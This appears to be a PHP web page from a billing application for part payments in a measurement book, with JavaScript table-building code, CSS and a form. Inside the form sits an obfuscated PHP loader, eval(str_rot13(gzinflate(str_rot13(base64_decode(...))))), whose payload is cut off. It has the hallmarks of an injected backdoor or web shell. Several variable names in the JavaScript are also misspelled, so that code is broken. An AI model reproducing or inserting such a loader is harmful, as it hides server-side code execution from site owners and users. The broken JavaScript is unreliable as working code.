								RemarkData += "<tr height='30px' style='color:white;font-family:verdana;font-size:13px;background-color:#078c9b;'><td colspan = '3'>Quantity : "+qty+"</td></tr>";
								RemarkData += "<tr height='27px' style='color:white;font-family:verdana;font-size:13px;background-color:#a5b23c;'><td>RBN No.</td><td>Date</td><td>Paid Percent ( % )</td></tr>";
								for(j=0; j<searchflagdetails.length; j+=3)
								{
									remarkPercent 	= searchflagdetaiils[j+0];
									remarkRbn 		= searchflagdetaiils[j+1];
									remarkDate 		= searchflagdetaiils[j+2];
									
									if((remarkPercent != "") && (remarkPercent != "X"))
									{
										//alert(remarkPercent)
										//alert(remarkRbn)
										RemarkData += "<tr id='trid"+j+"'><td>"+remarkRbn+"</td><td>"+remarkDate+"</td><td>"+remarkPercent+"</td></tr>";
									}
								}
								RemarkData += "</table>";
						}
						//var rate = document.getElementById("txt_item_rate_slm0").value;
						var amount = Number(qty)*Number(percent)*Number(rate)/100;
						 	TotalPaidDpmAmount = (Number(TotalPaidDpmAmount)+Number(amount));
						var table = document.getElementById("table3");
						var row = table.insertRow(table.rows.length-2);
							row.id = "rowid_dpm"+index;
							row.style.align = "center";
							
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "");
							cell1.style.textAlign = "center";	
							cell1.style.padding = "0px 0px 0px 0px";
						if(searchflag == "X")
						{	
							var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
						}
						else
						{
							var txt_box1 = document.createElement("input");
							txt_box1.type = "hidden";
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							
							var srch_btn1 = document.createElement("input");
							srch_btn1.type = "image";
							srch_btn1.name = "srch_btn_dpm";
							srch_btn1.style.textAlign = "center";
							srch_btn1.id = "srch_btn_dpm"+index;
							srch_btn1.src = "images/search (10).png";
							srch_btn1.style.width = 25+"px";
							srch_btn1.style.height = 20+"px";
							
							var txt_remarkdata_dpm_1 = document.createElement("input");
								txt_remarkdata_dpm_1.type = "hidden";
								txt_remarkdata_dpm_1.id = "hid_dpm_remarkdata"+index;
								txt_remarkdata_dpm_1.name = "hid_dpm_remarkdata[]";
								txt_remarkdata_dpm_1.value = RemarkData;
								txt_remarkdata_dpm_1.setAttribute('class', "dynamictextbox");
								txt_remarkdata_dpm_1.style.width = 70+"px";
								txt_remarkdata_dpm_1.style.borderRadius = 0+"px";
								cell1.appendChild(txt_remarkdata1_dpm_1);
							
							//srch_btn1.style.textAlign = "center";
							//srch_btn1.style.pointerEvents = "none";
							//srch_btn1.setAttribute('class', "dynamictextbox"); 
							/*txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index);*/
							cell1.appendChild(srch_btn1);
							srch_btn1.onclick = (function (ind) {
												return function() {
												  ShowRemarks(ind1)
												  };
												})(index);
							/*srch_btn1.onclick = function () {
												  ShowRemarks(RemarkData)
												}*/
						}
								
							
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_partpay_qty_dpm";
							txt_box2.id = "txt_partpay_qty_dpm"+index;
							txt_box2.value = Number(qty).toFixed(3);
							txt_box2.style.width = 90+"px";
							txt_box2.style.textAlign = "right";
							txt_box2.style.pointerEvents = "none";
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_item_rate_dpm";
							txt_box3.id = "txt_item_rate_dpm1"+index;
							txt_box3.value = Number(rate).toFixed(2);
							txt_box3.style.width = 80+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.pointerEvents = "none";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_percent_dpm";
							txt_box4.id = "txt_partpay_percent_dpm1"+index;
							txt_box4.value = Number(percent);
							txt_box4.style.width = 35+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						var cell5=row.insertCell(4);
							cell5.setAttribute('class', "dynamicrowcell");	
							cell5.style.padding = "0px 0px 0px 0px";
						var txt_box5 = document.createElement("input");
							txt_box5.name = "txt_partpay_amt_dpm";
							txt_box5.id = "txt_partpay_amt_dpm"+index;
							txt_box5.value = Number(amount).toFixed(2);
							txt_box5.style.width = 110+"px";
							txt_box5.style.textAlign = "right";
							txt_box5.style.pointerEvents = "none";
							txt_box5.setAttribute('class', "dynamictextbox"); 
							cell5.appendChild(txt_box5);
							
						var cell6=row.insertCell(5);
							cell6.setAttribute('class', "dynamicrowcell");	
							cell6.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box6 = document.createElement("input");
								txt_box6.name = "txt_percent_dpm_payable";
								txt_box6.id = "txt_percent_dpm_payable1"+index;
								txt_box6.value = Number(PayableDpmSlmPercent);
								txt_box6.style.width = 35+"px";
								txt_box6.style.border = "1px solid #2aade4";
								txt_box6.style.backgroundColor = "#ffffff";
								txt_box6.style.textAlign = "right";
								txt_box6.setAttribute('class', "dynamictextbox");
								txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index); 
								cell6.appendChild(txt_box6);
						}
						else
						{
							cell6.innerHTML = "";
						}
							
						var cell7=row.insertCell(6);
							cell7.setAttribute('class', "dynamicrowcell");	
							cell7.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box7 = document.createElement("input");
								txt_box7.name = "txt_amt_dpm_payable1[]";
								txt_box7.id = "txt_amt_dpm_payable"+index;
								txt_box7.value = Number(PayAbleSlmDpmAmt).toFixed(2);
								txt_box7.style.width = 110+"px";
								txt_box7.style.textAlign = "right";
								txt_box7.style.pointerEvents = "none";
								txt_box7.setAttribute('class', "dynamictextbox"); 
								cell7.appendChild(txt_box7);
						}
						else
						{
							cell7.innerHTML = "";
						}
						
						var txt_box8 = document.createElement("input");
							txt_box8.type = "hidden";
							txt_box8.id = "hid_dpm_result"+index;
							txt_box8.name = "hid_dpm_result[]";
							txt_box8.value = result;
							txt_box8.setAttribute('class', "dynamictextbox");
							txt_box8.style.width = 70+"px";
							txt_box8.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box8);
							
						var txt_box9 = document.createElement("input");
							txt_box9.type = "hidden";
							txt_box9.id = "hid_dpm_mbid"+index;
							txt_box9.name = "hid_dpm_mbid";
							txt_box9.value = mbookid;
							txt_box9.setAttribute('class', "dynamictextbox");
							txt_box9.style.width = 70+"px";
							txt_box9.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box9);
						index++;	
					}
					document.getElementById("txt_partpay_total_paidamt_dpm").value = Number(TotalPaidDpmAmount).toFixed(2);
					document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(TotalPayableDpmAmount).toFixed(2);
				}
				
			}
		}
		xmlHttp.send(strURL);	
	}
	
	function getSLMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp; 
		var data;
		var i, rbn, qty, percent, newrow = "", amt;
		var slmitemQty = document.getElementById("hid_slm_qty").value;
		if(Number(slmitemQty) == 0)
		{
			document.getElementById("rowid0").className = "hide";
			document.getElementById("slmheadrow").className = "hide";
			document.getElementById("slmtotalrow").className = "hide";
			document.getElementById("slmremarksrow").className = "hide";
		}
		else
		{
			document.getElementById("rowid0").className = "";
			document.getElementById("slmheadrow").className = "";
			document.getElementById("slmtotalrow").className = "";
			document.getElementById("slmremarksrow").className = "";
		}
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_slm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText; 
				if(data != "")
				{
					
					var x = Number(document.getElementById("table4").rows.length);
					var index = x;
					var Splitdata = data.split("@@");
					var SlmRemarks = Splitdata[1];
					var SlmDetails = Splitdata[0];
					var details = SlmDetails.split("*");
					for(i=0; i<details.length; i+=3)
					{
						//var arr = index;
						var arg = "X"+"*"+index;
							rbn 	= details[i];
							qty 	= details[i+1];
							percent = details[i+2];
							var result = percent+"*"+rbn+"*"+qty+"*"+itemid;
							amt 	= Number(qty)*Number(rate)*Number(percent)/100;
						var table=document.getElementById("table4");
						var row=table.insertRow(table.rows.length-2);
							row.id = "rowid"+index;
							row.style.align = "center";
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "dynamicrowcell");
							cell1.style.padding = "0px 0px 0px 0px";
								
						var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_partpay_qty_slm1[]";
							txt_box1.id = "txt_partpay_qty_slm"+index;
							txt_box1.value = Number(qty);
							txt_box1.style.width = 93+"px";
							txt_box1.style.border = "1px solid #2aade4";
							txt_box1.style.textAlign = "right";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm");
												};
											})(index);
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_item_rate_slm1";
							txt_box2.id = "txt_item_rate_slm1"+index;
							txt_box2.value = Number(rate).toFixed(2);
							txt_box2.style.textAlign = "right";
							txt_box2.style.width = 80+"px";
							//txt_box2.readOnly = true;
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm");
												};
											})(index);
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_partpay_percent_slm1";
							txt_box3.id = "txt_partpay_percent_slm1"+index;
							txt_box3.value = percen1t;
							txt_box3.style.width = 40+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.border = "1px solid #2aade4";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							txt_box3.onblur= (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm");
												ValidatePercent(this,"slm",ind);
												};
											})(index);
											
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_amt_slm1[]";
							txt_box4.id = "txt_partpay_amt_slm"+index;
							txt_box4.value = Number(amt).toFixed(2);
							txt_box4.style.width = 130+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						
						if(i == 0)
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var addbtn=document.createElement("input");
								addbtn.type = "button";
								addbtn.value = " + ";
								addbtn.id = "btn_add_row_slm1"+index;
								addbtn.name = "btn_add_row_slm";
								addbtn.setAttribute('class', "delbtnstyle");
								addbtn.style.width = 32+"px";
								addbtn.style.borderRadius = 0+"px";
								addbtn.onclick = function () {
												  addRow()
												}
								cell5.appendChild(addbtn);
						
						
						}
						else
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var delbtn=document.createElement("input");
								delbtn.type = "button";
								delbtn.value = " X ";
								delbtn.id = "btn_delete"+index;
								delbtn.name = "btn_delete";
								delbtn.setAttribute('class', "delbtnstyle");
								delbtn.style.width = 32+"px";
								delbtn.style.borderRadius = 0+"px";
								delbtn.onclick = (function (ind) {
												  //deleteRow(row.id)
												  	return function() {
													deleteRow(this);
													};
												})(index);
								cell5.appendChild(delbtn);
						}	
						
							//var cell6=row.insertCell(5);
							//cell5.style.width = 10+"px";
							//cell6.style.textAlign = "center";
							//cell6.style.padding = "0px 0px 0px 0px";
							//cell6style.visibility = "hidden";	
							
					// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
						var txt_box5 = document.createElement("input");
							txt_box5.type = "hidden";
							txt_box5.id = "hid_slm_result"+index;
							txt_box5.name = "hid_slm_result1[]";
							txt_box5.value = result;
							txt_box5.setAttribute('class', "dynamictextbox");
							txt_box5.style.width = 70+"px";
							txt_box5.style.borderRadius = 0+"px";
							cell5.appendChild(txt_box5);
							index++;
						var elmt = document.getElementById("rowid0");
							elmt.style.display = "none";
							totalAmountCalculation("slm");
						//index++;
							result = "";
					}
					if(SlmRemarks != "")
					{
						document.getElementById("txt_slm_remarks").value = SlmRemarks;
					}
					else
					{
						document.getElementById("txt_slm_remarks").value = "";
					}
				}totalAmountCalculation("slm");
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);

			}
		}
		xmlHttp.send(strURL);	
	}
	
	function saveDataDetails()
	{
		var result1 = "X";
		$('input[name="hid_slm_result[]"]').each(function() {
			var res1 = $(this).val();
			if(res1 != "")
			{
				result1 = res1 + "@"+ result1;
			}
		});
		
		var result2 = "Y";
		$('input[name="hid_dpm_result[]"]').each(function() {
			var res2 = $(this).val();
			result2 = res2 + "@"+ result2;
		});
		//alert(result1)
		//alert(result2)
		var result = result1 + "###" + result2;
		//alert(result);
		var itemid = document.getElementById("txt_item_id").value;
		var itemStr = document.getElementById("hid_item_str").value;
		var SlmRemarks = document.getElementById("txt_slm_remarks").value;
		var DpmRemarks = document.getElementById("txt_dpm_remarks").value;
		var RemarksStr = SlmRemarks + "@*@" + DpmRemarks;
		//alert(result);
		var sheetid = document.getElementById("txt_sheet_id").value;
		$.post("Partpayment_Update.php", {resultdata: result, sheetid: sheetid, itemStr: itemStr, RemarksStr: RemarksStr}, function (data) {
		//alert(data);
			if(data == 1)
			{
				
				//swal("", "Sucessfully Updated...!", "success");
				location.reload();
				//$.modal.close();
				
			}
        });
		

	}
	
	function ShowRemarks(id)
	{
		var idcount = id;
		var RemarksData = document.getElementById("hid_dpm_remarkdata"+idcount).value;
		swal({
		title: "<small>Deduct Previous Measurement Remarks</small>",
		text: "<small>"+RemarksData+"</small>",
		html: true
	});
	}
	
	function SaveData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to update this data..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Update!",   
			cancelButtonText: "No, Cancel!",   
			closeOnConfirm: false,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{     
				saveDataDetails();  
			} 
			else 
			{     
				swal("Cancelled", "Your data not updated:)", "error");   
			} 
		});
	}
	function CancelData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to Cancel this operation..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Cancel!",   
			cancelButtonText: "No, Stay on this!",   
			closeOnConfirm: true,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{   
				  
				$.modal.close();  
			} 
			else 
			{     
				swal({   
				title: "Please Wait!",   
				text: "Your Page will be redirected..",   
				timer: 2000,   showConfirmButton: false 
				});
			} 
		});
	}
</script>
<style>
.pagetitle
{
	text-shadow:
    -1px -1px 0 #7F7F7F,
    1px -1px 0 #7F7F7F,
    -1px 1px 0 #7F7F7F,
    1px 1px 0 #7F7F7F; 
}
.table1
{
	color:#BF0602;
	/*color:#921601;*/
	border: 1px solid #cacaca;
	border-collapse: collapse;
}
.table1 td
{ 
	border: 1px solid #cacaca;
	border-collapse: collapse;
}
.fontcolor1
{
	color:#FFFFFF;
}

.popuptitle
{
	background-color:#0080FF;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.table2
{
	color:#071A98;
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.table2 td
{
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.bottomsection
{
 	position: absolute;
    bottom: 0;
	width:100%;
	line-height:38px;
}
.buttonsection
{
	display: inline-block;
	line-height:38px;
}
.buttonstyle
{
	background-color:#0080FF;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #0080FF;
	-webkit-box-shadow: 0px 1px 0px 0px #0080FF;
	box-shadow: 0px 1px 0px 0px #0080FF;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #0080FF));
	background:-moz-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #0080FF 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#0080FF',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}
.popuptextbox
{
	border:none;
	font-family:Verdana;
	font-size:12px;
	font-weight:bold;
	color:#DE0117;
	text-align:center;
	pointer-events: none;
}
.dynamictextbox
{
	border:1px solid #ffffff;
	height:21px;
	color:#DE0117;
	font-weight:bold;
}
.dynamictextbox:hover, .dynamictextbox:focus
{
	/*outline: none;*/
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
    /*border-color: #9ecaed;
    box-shadow: 0 0 10px #9ecaed;*/
}
.dynamictextbox2
{
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;	
}
.dynamicrowcell
{
	padding-bottom:0px;
	padding-top:0px; 
	padding-left:0px; 
	padding-right:0px;
	text-align:right;
	font:Verdana, Arial, Helvetica, sans-serif;
}
.hide
{
	display:none;
}
.labelprint
{
	font-weight:normal;
	color:#000000;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:10pt;
}
@media print 
{
	.printbutton
	{
		display: none !important;
	}
}
/*.table1 tr:nth-child(even) {background: #CCC}
.table1 tr:nth-child(odd) {background: #FFF}*/
</style>		
<body bgcolor="" onload="setRowSpan();noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<!--<table width="1087px" height="56px" align="center" class='label' bgcolor="#0A9CC5">
	<tr bgcolor="#0A9CC5" style="position:fixed;">
		<td style="color:#FFFFFF; border:none; font-size:16px;" width="1077px"  height="48px" class="pagetitle" align="center">ABSTRACT MEASUREMENT BOOK - PART PAYMENT</td>
	</tr>
</table>-->
<form name="form" method="post" onsubmit="return confirm('Do you really want to submit the Book?');">
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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